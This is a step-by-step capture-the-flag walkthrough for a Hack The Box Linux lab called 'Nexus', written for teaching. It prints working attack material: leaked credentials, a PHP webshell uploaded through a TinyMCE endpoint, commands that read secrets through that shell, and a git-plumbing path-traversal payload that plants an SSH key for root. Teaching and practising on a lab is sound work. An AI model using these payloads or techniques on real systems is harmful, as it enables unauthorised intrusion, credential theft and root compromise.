# HTB "Nexus" — Beginner-Friendly Step-by-Step Guide

> **Purpose of this doc:** this is a *teaching* walkthrough, not a formal report.
> The goal is for someone who has never touched this box to follow along, understand
> **why** each step works (not just copy-paste commands), and come away able to spot
> this class of bug on a different box. Share it freely with teammates working the
> same lab.
>
> **A note on flags:** HTB gives every user their own spin-up of a box with unique
> flag values, so the exact flag string below won't match what you get on your own
> instance — only the *method* transfers. Flags are shown partially redacted for
> that reason, not for secrecy.

**Box:** Nexus · **Difficulty:** Easy · **OS:** Linux (Ubuntu)
**What you'll practice:** vhost enumeration past a wildcard, mining git history for
secrets, credential reuse, exploiting a file-upload RCE, and a privilege escalation
that requires understanding git internals, not just running a scanner.

---

## Before you start

- Connect to the HTB VPN and confirm you can reach the target IP (`ping` won't
  necessarily work — HTB blocks ICMP on many boxes — so don't panic if it doesn't;
  use a TCP check instead, shown below).
- Tools used throughout: `nmap`, `curl`, `ffuf` (optional), `git`, `ssh`,
  `python3` (with `paramiko` for scripted SSH, or just use the `ssh`/`sshpass` CLI).
- Add a scratch directory to work from, e.g. `mkdir nexus && cd nexus`.

---

## Step 1 — Confirm the target is up

```bash
timeout 5 bash -c 'echo > /dev/tcp/<TARGET_IP>/80' && echo "port 80 is up"
```

💡 **Why `timeout ... /dev/tcp/...` instead of `ping`?** Many HTB boxes drop ICMP
entirely. A raw TCP connect attempt to a port you expect to be open is a much more
reliable "is this thing alive" check than `ping`.

---

## Step 2 — Full port scan

```bash
nmap -p- --min-rate=1000 -T4 -oN allports.txt <TARGET_IP>
nmap -sC -sV -p22,80 -oN services.txt <TARGET_IP>
```

**Result:** only two ports open —

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80 | HTTP | nginx 1.24.0 (Ubuntu) |

🎯 **Takeaway:** a small attack surface at the network layer almost always means the
real complexity is hiding in the *web application layer* — virtual hosts, not more
open ports. That's exactly what happens here.

---

## Step 3 — Find the real websites (defeating a wildcard vhost)

Visiting `http://<TARGET_IP>/` redirects you to `http://nexus.htb/`. Add that to
your hosts file:

```bash
echo "<TARGET_IP> nexus.htb" | sudo tee -a /etc/hosts
```

Now, the tempting next move is to fuzz for subdomains with a wordlist:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.nexus.htb" -u http://<TARGET_IP>/ -fs <size_of_default_page>
```

**This will come back basically empty.** Here's why, and it's an important lesson:

```bash
curl -s -H "Host: doesnotexist123.nexus.htb" http://<TARGET_IP>/ -D -
# HTTP/1.1 302 Found
# Location: http://nexus.htb/
```

nginx has a **wildcard/default server block** — *any* `Host:` header it doesn't
recognize gets redirected to `nexus.htb`. Since ffuf can't tell "redirected because
it's a real-but-boring vhost" apart from "redirected because this name doesn't
exist," a response-size/status filter can't distinguish a hit from a miss. Every
guess looks identical.

💡 **How to actually find the real vhosts here:** read the content of the one site
you *do* have. The homepage has a Careers section advertising a job, and a
testimonial mentioning a "grid data portal" — flavor text, but it hints at what
kind of subdomains might exist (CRM/billing/portal/git-type names). Guessing
targeted names from that content finds:

```bash
curl -s -H "Host: git.nexus.htb" http://<TARGET_IP>/     # -> real site, no redirect
curl -s -H "Host: billing.nexus.htb" http://<TARGET_IP>/ # -> real site, no redirect
```

Add both to `/etc/hosts`:

```bash
echo "<TARGET_IP> git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

🎯 **Takeaway:** a wildcard vhost block is not access control, it's just an
automated-scanner deterrent. When wordlist fuzzing goes suspiciously quiet, check
for a catch-all redirect before concluding "there's nothing else here."

---

## Step 4 — Mining a public Git server for secrets

`git.nexus.htb` turns out to be a **Gitea** instance (self-hosted GitHub-alike),
and it's browsable **without logging in**. There's one public repository:
`admin/krayin-docker-setup`, with two commits.

This is the single most important habit to build from this box: **always read a
public repo's full commit history, not just its current files.** A secret that's
been "removed" in the latest commit is still sitting in every earlier commit,
and Gitea (like GitHub) happily serves old diffs to anyone:

```bash
curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/1615c465b74e5d7ad3162873382dd8b3869ca892.diff
```
```diff
+DB_PASSWORD=N27xh!!2ucY04
```

A later commit (`9b817fa4e0...`) shows the password being scrubbed from the *live*
`.env` — but that's irrelevant, because the diff above already leaked it forever.

```bash
curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/9b817fa4e073d12fc43952acb09f3067b2f17adf.diff
```
```diff
-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=
```

🎯 **Takeaway:** "we removed it in the next commit" is **not** the same as "we
rotated it." If you ever find this pattern in a real engagement, assume the
credential is burned the moment it hit the repo, not the moment it was deleted.

---

## Step 5 — Find a username to go with that password

Back on the main site (`nexus.htb`), the Careers section's job-posting modal
("Operations Specialist – Customer Platforms") names a real hiring-manager contact:
`j.matthew@nexus.htb`, alongside the generic `careers@nexus.htb` alias.

💡 **Why this matters:** a leaked password is useless without a username to pair it
with. Company "About us," "Team," and "Careers" pages are classic (and
embarrassingly easy) sources of real employee usernames/emails — far easier than
brute-forcing a login form.

---

## Step 6 — Log into Krayin CRM

`billing.nexus.htb` turns out to be **Krayin CRM** (a Laravel-based open-source
CRM), redirecting to `/admin/login`. Laravel login forms need a CSRF token, which
you grab from a GET request first:

```bash
curl -s -c cookies.txt http://billing.nexus.htb/admin/login -o login.html
TOKEN=$(grep -o 'name="_token" value="[^"]*"' login.html | sed -E 's/.*value="([^"]*)".*/\1/')

curl -s -b cookies.txt -c cookies.txt -i -X POST http://billing.nexus.htb/admin/login \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "email=j.matthew@nexus.htb" \
  --data-urlencode "password=N27xh!!2ucY04"
```

```
HTTP/1.1 302 Found
Location: http://billing.nexus.htb/admin/dashboard    # success!
```

(A failed login 302s back to `/admin/login` instead — that's how you tell the two
apart without needing to parse a page body.)

🎯 **Takeaway:** two completely passive information leaks (old git history + a
staff email) combined, through simple password reuse, into a working admin login.
Neither step involved exploiting anything — just reading.

---

## Step 7 — Turning admin access into code execution (CVE-2026-38526)

Krayin ships a TinyMCE rich-text editor, and its image-upload endpoint,
`/admin/tinymce/upload`, is where this box's headline vulnerability lives: it
**accepts any file extension** and only checks the `Content-Type` field the
*client* sends — which you fully control and can simply lie about.

First, write a minimal PHP "webshell" — just enough to run one command via a URL
parameter:

```php
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
```

Then upload it, declaring it as an innocent JPEG:

```bash
XSRF=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('$(grep XSRF-TOKEN cookies.txt | awk \"{print \\$7}\")'))")

curl -s -b cookies.txt -c cookies.txt \
  -H "X-XSRF-TOKEN: $XSRF" \
  -F "file=@shell.php;type=image/jpeg" \
  http://billing.nexus.htb/admin/tinymce/upload
```

```json
{"location":"http://billing.nexus.htb/storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php"}
```

The server stored our `.php` file, unmodified, under a path anyone can request.
Visit it and pass a command:

```bash
curl -s "http://billing.nexus.htb/storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**We have code execution.** 🎉

💡 **Why no reverse shell / netcat listener?** This webshell gives you one-shot
command execution per HTTP request — good enough for everything from here on, and
simpler/more reliable than setting up `nc -lvnp` and catching a connection back.
If you *do* want an interactive shell later, you certainly can — but for a box
like this, treat "can I just run one command and read the output" as your first
option, not your last resort.

---

## Step 8 — Finding a second leaked credential (and capturing user.txt)

Now that we can run commands as `www-data`, read the CRM's own live configuration
file — it's sitting right there on disk:

```bash
curl -s ".../shell.php?cmd=cat+/var/www/krayin/.env"
```
```
DB_PASSWORD=y27xb3ha!!74GbR
```

Notice this is **different** from the password we found in Gitea's history
(`N27xh!!2ucY04`). The database password actually *was* rotated — good practice on
paper. The problem: this new value was reused *again*, this time as a real Linux
user's login password.

```bash
ssh jones@<TARGET_IP>
# password: y27xb3ha!!74GbR
id
# uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)

cat /home/jones/user.txt
```

```
🏁 user.txt: 4a6f••••••••••••••••••••••••••••
```

🎯 **Takeaway:** rotating a password *only where it leaked* doesn't help if that
same value is reused somewhere else entirely. Any future bug in this web app
hands out a real system login for free.

---

## Step 9 — Hunting for privilege escalation (the dead ends matter too)

Run the standard checklist first — and in this case, **every single one of them
is a dead end**, which is itself worth seeing, so you learn to move past them
quickly instead of getting stuck:

```bash
sudo -l
# "Sorry, user jones may not run sudo on nexus." — nothing here

find / -perm -4000 -o -perm -2000 2>/dev/null
# only stock Ubuntu SUID/SGID binaries (passwd, su, mount, etc.) — nothing custom

getcap -r / 2>/dev/null
# only ping/mtr-packet and a couple of stock system helpers — nothing abusable

cat /etc/crontab; ls -la /etc/cron.d/
# only stock Debian/Ubuntu jobs — nothing jones-writable
```

💡 **The lesson here:** a lot of guides jump straight to "check sudo, check SUID,
check cron" as if that's the whole checklist — and on a lot of easy boxes, it is.
On this one, it's a deliberate misdirection. The real scheduled-task mechanism on
a modern Linux box is often **systemd timers**, not legacy cron, and it's easy to
forget to check for them:

```bash
systemctl list-timers --all
```
```
NEXT     LEFT    LAST    PASSED   UNIT                        ACTIVATES
...      <60s    ...     ...      gitea-template-sync.timer   gitea-template-sync.service
```

There it is — a custom, non-cron scheduled job.

```bash
systemctl cat gitea-template-sync.service
```
```
[Service]
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
User=root
```

A script, running **as root**, every 60 seconds. That's our target.

🎯 **Takeaway:** always run `systemctl list-timers --all` *and* `list-units`
alongside your cron checks on any modern Ubuntu/systemd box. Plenty of writeups
(and plenty of real-world misconfigurations) live in timers, not crontabs.

---

## Step 10 — Understanding the bug (a quick git-internals primer)

Reading `/etc/gitea/template-sync.py` (you can `cat` it through your webshell or
once you have an SSH session) shows the logic: for every Gitea repo flagged
`template: true`, it runs `git ls-tree -r HEAD` to list every file in that repo,
and for each one does, roughly:

```python
target = os.path.join(STAGING_DIR, owner, repo, filepath)
open(target, "wb").write(blob_content)
```

**as root**, with no check that `target` actually stays inside `STAGING_DIR`.

Here's the key insight you need to exploit this, and it's a genuinely useful thing
to know about git in general:

> Git has two layers of commands. **Porcelain** commands (the ones you use daily —
> `git add`, `git commit`, `git checkout`) include lots of safety checks, including
> refusing a file or directory literally named `..`. **Plumbing** commands (the
> low-level ones: `git hash-object`, `git mktree`, `git commit-tree`) are the raw
> building blocks porcelain is built on — and they have **no such safety check**.
> You can absolutely build a tree object with an entry named `..` using plumbing,
> even though `git checkout` would never let that entry exist on disk normally.

So: if a script trusts `git ls-tree`'s output as a safe relative path, and that
tree was built with plumbing commands instead of normal commits, you can make
`ls-tree` print something like `../../../../../root/.ssh/authorized_keys` — and
the script will faithfully write to exactly that path.

---

## Step 11 — Exploiting it, step by step

**1. Create a repo you own, and flag it as a Gitea "template"** (this is what
makes the sync service pick it up — your Gitea login works over the API too,
same password as SSH):

```bash
curl -u jones:y27xb3ha!!74GbR -X POST http://git.nexus.htb/api/v1/user/repos \
  -d '{"name":"pwn-template","auto_init":true,"default_branch":"main"}'

curl -u jones:y27xb3ha!!74GbR -X PATCH http://git.nexus.htb/api/v1/repos/jones/pwn-template \
  -d '{"template":true}'
```

**2. Build the malicious tree.** We want the final flattened path to be
`root/.ssh/authorized_keys`, wrapped in enough `..` entries to escape the staging
directory back to filesystem root (the staging path here is 5 components deep,
so we need 5 levels):

```bash
ssh-keygen -t ed25519 -f pwn_key -N '' -C 'pwn@nexus'

BLOB=$(git hash-object -w pwn_key.pub)
T1=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB" | git mktree)
T2=$(printf '040000 tree %s\t.ssh\n' "$T1" | git mktree)
T3=$(printf '040000 tree %s\troot\n' "$T2" | git mktree)
CUR=$T3
for i in 1 2 3 4 5; do CUR=$(printf '040000 tree %s\t..\n' "$CUR" | git mktree); done
COMMIT=$(git commit-tree "$CUR" -m "template sync traversal payload")
```

**3. Force-push it** to your template repo:

```bash
git push -f http://jones:y27xb3ha!!74GbR@git.nexus.htb/jones/pwn-template.git "$COMMIT:refs/heads/main"
```

**4. Wait up to 60 seconds**, then just try root SSH with your crafted key:

```bash
ssh -i pwn_key root@<TARGET_IP>
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

```
🏁 root.txt: e335••••••••••••••••••••••••••••
```

**You're root.** 🏆

---

## Key Takeaways (apply these on your next box)

1. **Always read full git history, not just the latest commit.** "Deleted" in git
   almost never means "gone." `git log`, then diff every commit, on any repo you
   can reach.
2. **Public "about us"/careers pages are a username goldmine.** Don't skip a
   company's marketing site just because it looks static and boring.
3. **A wildcard/catch-all vhost defeats wordlist fuzzing — not you.** If broad
   fuzzing goes suspiciously quiet, test an obviously-fake hostname first to check
   for a catch-all before concluding there's nothing else to find.
4. **Rotating a credential only where it leaked isn't rotation.** If the same
   value is reused anywhere else, the leak is still live.
5. **`systemctl list-timers --all` belongs next to `cat /etc/crontab` in your
   privesc checklist**, every time, on every modern Linux box.
6. **Git has two layers (porcelain vs. plumbing) with very different safety
   guarantees.** Any time a script trusts `git ls-tree`/`git show`/similar output
   as a "safe" relative path, ask whether that repo's content is attacker-controlled
   — because plumbing commands can produce paths porcelain would never allow.
7. **Prefer one-shot command execution (a web shell, direct RCE) over a reverse
   shell when you don't actually need an interactive session.** It's simpler, and
   it keeps working even in environments where listener-based shells are
   unreliable.

---

*Companion files in this workspace if you want the full evidence trail:
`GLOBAL_CONTEXT.md` (raw findings ledger), `walkthrough.md` (formal writeup),
`report.html` / `report.pdf` (shareable pentest-report format).*
